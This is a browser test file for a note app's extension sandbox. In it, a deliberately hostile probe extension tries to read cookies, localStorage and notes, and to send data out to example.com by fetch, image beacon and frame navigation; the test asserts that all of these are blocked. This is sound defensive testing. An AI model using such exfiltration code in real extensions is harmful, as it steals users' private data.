// The sandbox, in a real browser against the real Worker (ADR 0006): a hostile workspace extension
// tries every way out, and none works. Run with `npm run test:browser` after `npm run build`; it needs
// Chrome (CHROME_PATH, or Chrome where it usually is).
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { test } from "node:test";
import type { Page } from "playwright-core";
import { browserTest, harness, runCommand, writeFile } from "./harness.ts";

const h = harness();

/** Put a workspace extension's files in, as the signed-in person. */
async function install(page: Page, id: string, files: Record<string, string>) {
  for (const [file, text] of Object.entries(files)) await writeFile(page, `.common-ink/extensions/${id}/${file}`, text);
}

/** Install an extension from the app's catalog, in the Extensions view, as you would. */
async function installFromCatalog(page: Page, name: string) {
  await runCommand(page, "Show extensions");
  const entry = page.locator(".catalog-entry", { hasText: name });
  await entry.getByRole("button", { name: "Install" }).click();
  await page.waitForFunction((name) => [...document.querySelectorAll(".notice p")].some((p) => p.textContent?.includes(`Installed ${name}`)), name);
}

const PROBE = `export default { async activate(ctx) {
  const r = {};
  const t = async (k, f) => { try { await f(); r[k] = "reached"; } catch (e) { r[k] = "blocked"; } };
  await t("cookie", () => document.cookie);
  await t("localStorage", () => localStorage.length);
  await t("parentDocument", () => parent.document.title);
  await t("fetchApp", () => fetch("/api/files"));
  await t("fetchOut", () => fetch("https://example.com/"));
  await t("image", () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error("no")); i.src = "https://example.com/beacon.png?d=1"; }));
  await t("readNote", () => ctx.files.read("Welcome.md"));
  await t("undeclaredHost", () => ctx.net.fetch("https://example.com/?d=1"));
  ctx.commands.register("probe.run", () => {});
  await ctx.workbench.notice("PROBE " + JSON.stringify(r));
  // Last: try to leave, with data in the address.
  setTimeout(() => { location.href = "https://example.com/?leaked=" + encodeURIComponent(JSON.stringify(r)); }, 50);
} };`;

test("a sandboxed extension can't read the app's cookies, storage, page or notes, or reach the network", async () => {
  const page = await h.browser.newPage();
  // Chrome reports a request it blocks by policy too, as one that failed with "csp";
  // anything else that set out for another host left the app.
  const outside = new Map<string, string>();
  page.on("request", (req) => {
    if (!req.url().startsWith(h.base)) outside.set(req.url(), "sent");
  });
  page.on("requestfailed", (req) => {
    if (outside.has(req.url())) outside.set(req.url(), req.failure()?.errorText ?? "failed");
  });
  await page.goto(`${h.base}/`);
  await page.waitForSelector(".cm-content");
  await page.evaluate(() => localStorage.setItem("secret", "1"));
  await install(page, "probe", {
    "extension.json": JSON.stringify({ name: "Probe", activationEvents: ["onCommand:probe.run"], contributes: { commands: [{ command: "probe.run", title: "Run probe" }] } }),
    "index.js": PROBE,
  });
  await page.reload();
  await page.waitForSelector(".cm-content");
  await runCommand(page, "Run probe");
  await page.waitForFunction(() => [...document.querySelectorAll(".notice p")].some((p) => p.textContent?.includes("PROBE")));
  const said = await page.evaluate(() => [...document.querySelectorAll(".notice p")].map((p) => p.textContent).find((t) => t?.includes("PROBE"))!);
  assert.deepEqual(JSON.parse(said.slice(said.indexOf("{"))), {
    cookie: "blocked",
    localStorage: "blocked",
    parentDocument: "blocked",
    fetchApp: "blocked",
    fetchOut: "blocked",
    image: "blocked",
    readNote: "blocked",
    undeclaredHost: "blocked",
  });
  await page.waitForTimeout(500);
  assert.deepEqual(
    [...outside].filter(([, how]) => how !== "csp" && how !== "net::ERR_BLOCKED_BY_CSP"),
    [],
    "nothing left the app, not even by navigating the frame away",
  );
  assert.ok(!page.frames().some((f) => f.url().includes("example.com")), "no frame got to the other site");
  await page.waitForFunction(() => document.body.textContent?.includes("tried to navigate its frame away"), null, { timeout: 5000 }).catch(() => {});
  const records = await page.evaluate(() => fetch("/api/files").then(() => document.querySelectorAll("iframe[title='Probe (extension host)']").length));
  assert.equal(records, 0, "and its host was stopped");
  await page.close();
});

/** A prompt's lines: who, what exactly, why now, why at all, its answers, and where to change it. */
const promptLines = (page: Page) =>
  page.evaluate(`[...document.querySelector(".dialog").querySelectorAll("h2, .dialog-asks li, .dialog-why-now, .dialog-why, .dialog-actions button, .dialog-note")].map((e) => e.textContent.replace(/\\s+/g, " ").trim())`) as Promise<string[]>;

browserTest(h, "Boards installs from the catalog and goes in at once, listed as from the Catalog and no longer offered", { scenario: "empty" }, async (app) => {
  const page = app.page;
  await installFromCatalog(page, "Boards");
  const files = await page.evaluate(() => fetch("/api/files").then((r) => r.json()));
  assert.deepEqual(
    (files.files ?? files).map((f: { path: string }) => f.path).filter((p: string) => p.startsWith(".common-ink/extensions/boards/")).sort(),
    [".common-ink/extensions/boards/extension.json", ".common-ink/extensions/boards/index.js", ".common-ink/extensions/boards/installed.json"],
    "its files are in the workspace, with where they came from",
  );
  // Installed, and listed so, with no reload: a sandboxed extension goes in at once.
  await page.waitForSelector('.extension-section .extension-row[data-extension="boards"]');
  assert.equal(await page.locator('.extension-row[data-extension="boards"] .badge').last().textContent(), "Catalog");
  assert.equal(await page.locator(".catalog-entry", { hasText: "Boards" }).count(), 0, "it's no longer offered");
  assert.equal(await page.locator(".banner", { hasText: "apply after reload" }).count(), 0);
});

/** Line count, the tests' sandboxed extension that reads the note on show (test/scenarios/extensions/). */
const LINE_COUNT = path.join(import.meta.dirname, "../scenarios/extensions/.common-ink/extensions/line-count");

/** What Line count's status bar item says, or null while it's hidden. */
const linesInStatusBar = (page: Page) =>
  page.evaluate(() => {
    const item = document.querySelector<HTMLElement>('.status-item[data-item="lineCount.status"]');
    return item && !item.hidden ? item.textContent : null;
  });

browserTest(h, "a sandboxed extension starts with the app, asking before it reads the note on show; Don't allow is kept", { scenario: "empty" }, async (app) => {
  const page = app.page;
  await app.writeFile("Welcome.md", "# Welcome\n\nTwo lines.\n");
  for (const f of ["extension.json", "index.js"]) await app.writeFile(`.common-ink/extensions/line-count/${f}`, fs.readFileSync(path.join(LINE_COUNT, f), "utf8"));
  await app.goto({}, "Welcome");
  await page.waitForSelector(".dialog");
  const lines = await promptLines(page);
  assert.equal(lines[2], "It's asking as the app started.");
  assert.deepEqual(
    lines.filter((_, i) => i !== 2),
    [
      "Line count Workspace wants to",
      "Read the note Welcome",
      "Line count says: “Count the lines in the note on show”",
      "Allow this time",
      "Always allow Line count to read all your notes",
      "Don't allow",
      "You can change this anytime in Extensions → Line count.",
    ],
  );
  assert.equal(await page.textContent(".dialog-details code"), "files:read Welcome.md", "the technical scope is behind Details");
  await page.click("text=Allow this time");
  await page.waitForFunction(() => /^\d+ lines?$/.test(document.querySelector('.status-item[data-item="lineCount.status"]')?.textContent ?? ""));
  // This time lasts until you reload; then it starts with the app.
  await page.reload();
  await page.waitForSelector(".dialog");
  assert.equal((await promptLines(page))[2], "It's asking as the app started.");
  await page.click("text=Don't allow");
  await page.waitForTimeout(1000);
  assert.equal(await linesInStatusBar(page), null, "nothing counted, nothing in the status bar");
  // Keeping the answer saves your settings, which Line count hears of and counts again: it isn't asked twice.
  await page.waitForTimeout(1500);
  assert.equal(await page.$(".dialog"), null, "one Don't allow is enough");
  const settings = await page.evaluate(() => fetch("/api/file?path=.common-ink%2Fusers%2Ftester%40localhost%2Fsettings.json").then((r) => r.json()));
  assert.deepEqual(JSON.parse(settings.text)["extensions.permissions"], { "line-count": { "files:read:**/*.md": "deny" } });
  await runCommand(page, "Show line count");
  const webview = await (await page.waitForSelector("iframe.webview")).contentFrame();
  await webview!.waitForFunction(() => /^Line count can't read the note \S+: you don't allow it to read all your notes\. Change that in Extensions → Line count\.$/.test(document.getElementById("count")?.textContent ?? ""));
  await page.reload();
  await page.waitForSelector(".cm-content");
  await page.waitForTimeout(1500);
  assert.equal(await page.$(".dialog"), null, "not asked again");
});

browserTest(h, "Word count installed from the Catalog before it left: the app starts without it, without errors, and clears its files and your answer to it away, as changes undo can take back", { scenario: "empty" }, async (app) => {
  const settingsPath = ".common-ink/users/tester@localhost/settings.json";
  await app.writeFile(settingsPath, JSON.stringify({ "extensions.permissions": { "word-count": { "files:read:**/*.md": "allow" }, boards: { "files:read:**/*.md": "allow" } } }));
  // Answers in the workspace's settings too: each file loses only its own answer to Word count.
  await app.writeFile(".common-ink/settings.json", JSON.stringify({ "extensions.permissions": { "word-count": { "files:read:**/*.md": "deny" }, pomodoro: { notifications: "allow" } } }));
  await app.writeFile(".common-ink/extensions/word-count/my-notes.md", "# Mine\n");
  await app.writeFile("Note.md", "# Note\n\nSome words.\n");
  await app.writeFile(".common-ink/extensions/word-count/extension.json", JSON.stringify({ id: "word-count", name: "Word count", version: "1.0.0", main: "index.js", activationEvents: ["onStartup"], permissions: { "files:read": { paths: ["**/*.md"], why: "Count the words in the note on show" } }, contributes: { statusBarItems: [{ id: "wordCount.status", alignment: "left", priority: 10 }] } }));
  await app.writeFile(".common-ink/extensions/word-count/index.js", 'export default { activate(ctx) { ctx.statusBar.set("wordCount.status", "counted"); } };\n');
  await app.writeFile(".common-ink/extensions/word-count/installed.json", '{"catalog": "Common Ink"}\n');
  await app.goto({}, "Note");
  await app.idle();
  await app.page.locator(".notice", { hasText: "A file you added in its folder stayed" }).waitFor();
  assert.deepEqual((await app.state()).extensions.filter((e) => e.id === "word-count"), []);
  await app.extensions.show();
  assert.equal(await app.page.locator('.extension-row[data-extension="word-count"]').count(), 0);
  assert.equal(await app.page.locator('[data-item="wordCount.status"]').count(), 0);
  assert.equal(await app.page.locator(".dialog").count(), 0, "nothing asks to read a note");
  for (const f of ["extension.json", "index.js", "installed.json"]) await app.page.waitForFunction(async (p) => (await fetch(`/api/file?path=${encodeURIComponent(p)}`)).status === 404, `.common-ink/extensions/word-count/${f}`);
  await app.page.waitForFunction(async (p) => !(await (await fetch(`/api/file?path=${encodeURIComponent(p)}`)).json()).text.includes("word-count"), settingsPath);
  assert.deepEqual(JSON.parse(await app.readFile(settingsPath))["extensions.permissions"], { boards: { "files:read:**/*.md": "allow" } }, "others' answers stay");
  await app.page.waitForFunction(async () => !(await (await fetch("/api/file?path=.common-ink%2Fsettings.json")).json()).text.includes("word-count"));
  assert.deepEqual(JSON.parse(await app.readFile(".common-ink/settings.json"))["extensions.permissions"], { pomodoro: { notifications: "allow" } }, "the workspace's own others stay");
  assert.equal(await app.readFile(".common-ink/extensions/word-count/my-notes.md"), "# Mine\n", "a file you added stays");
  // Each file written by the test, then cleared away: two changes in History for each.
  const changes = (await app.state()).history.filter((c) => (c.path.includes("word-count") && !c.path.endsWith(".md")) || c.path === settingsPath).map((c) => c.path).sort();
  assert.deepEqual(changes, [settingsPath, settingsPath, ...[".common-ink/extensions/word-count/extension.json", ".common-ink/extensions/word-count/index.js", ".common-ink/extensions/word-count/installed.json"].flatMap((p) => [p, p])].sort());
});
